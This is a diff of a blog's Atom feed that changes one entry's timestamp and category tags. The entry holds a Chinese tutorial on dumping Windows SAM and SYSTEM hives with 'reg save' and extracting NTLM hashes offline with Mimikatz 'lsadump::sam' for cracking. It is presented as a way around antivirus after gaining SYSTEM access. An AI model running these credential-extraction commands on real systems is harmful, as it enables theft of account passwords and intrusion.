@@ -121,7 +121,7 @@
     <link href="https://vxer-lee.github.io/mimikatz%E7%A0%B4%E8%A7%A3Windows%E7%99%BB%E9%99%86%E5%AF%86%E7%A0%81.html"/>
     <id>https://vxer-lee.github.io/mimikatz%E7%A0%B4%E8%A7%A3Windows%E7%99%BB%E9%99%86%E5%AF%86%E7%A0%81.html</id>
     <published>2020-01-07T03:59:38.000Z</published>
-    <updated>2020-08-13T06:21:17.574Z</updated>
+    <updated>2020-08-13T06:27:27.959Z</updated>
     
     <content type="html"><![CDATA[<h2 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h2><p>已获取system权限，无法在目标机器上上传Mimikatz(有杀软或者限制啥的)，这个时候可以通过reg命令导出SAM和SYSTEM文件，离线读取出NTML HASH，其实也可以用procdump64和mimikatz抓取Windows用户密码，这个小技巧算是另外一种方式吧</p><h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><p>首先导出两个文件，可能需要管理员权限 ，CMD或者Powershell运行都可以。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg save hklm\sam sam.hive</span><br><span class="line">reg save hklm\system system.hive</span><br></pre></td></tr></table></figure><p><img src="/mimikatz%E7%A0%B4%E8%A7%A3Windows%E7%99%BB%E9%99%86%E5%AF%86%E7%A0%81/1.png" alt="img"></p><p>然后将这两个hive文件放到和Mimikatz同一个目录下，你可将目标机器的这两个文件拖出来到自己机器上尝试</p><p>mimikatz下载链接：<a href="https://github.com/gentilkiwi/mimikatz/releases/tag/2.2.0-20200809" target="_blank" rel="noopener">https://github.com/gentilkiwi/mimikatz/releases/tag/2.2.0-20200809</a></p><p><img src="/mimikatz%E7%A0%B4%E8%A7%A3Windows%E7%99%BB%E9%99%86%E5%AF%86%E7%A0%81/2.png" alt="img"><br>.</p><p>运行mimikatz，输入命令</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::sam /sam:sam.hive /system:system.hive</span><br></pre></td></tr></table></figure><p><img src="/mimikatz%E7%A0%B4%E8%A7%A3Windows%E7%99%BB%E9%99%86%E5%AF%86%E7%A0%81/ntlm.png" alt="img"><br>获取NTML后，我们对其进行解密，就随便找个稍微好用的解密网站就行，这里用cmd5进行解密<br><img src="/mimikatz%E7%A0%B4%E8%A7%A3Windows%E7%99%BB%E9%99%86%E5%AF%86%E7%A0%81/123456.png" alt="img"><br>.</p>]]></content>
     
@@ -135,10 +135,10 @@
     </summary>
     
     
-      <category term="内网攻防" scheme="https://vxer-lee.github.io/categories/%E5%86%85%E7%BD%91%E6%94%BB%E9%98%B2/"/>
+      <category term="渗透" scheme="https://vxer-lee.github.io/categories/%E6%B8%97%E9%80%8F/"/>
     
     
-      <category term="Web渗透" scheme="https://vxer-lee.github.io/tagsssss/Web%E6%B8%97%E9%80%8F/"/>
+      <category term="内网攻防" scheme="https://vxer-lee.github.io/tagsssss/%E5%86%85%E7%BD%91%E6%94%BB%E9%98%B2/"/>
     
   </entry>
   
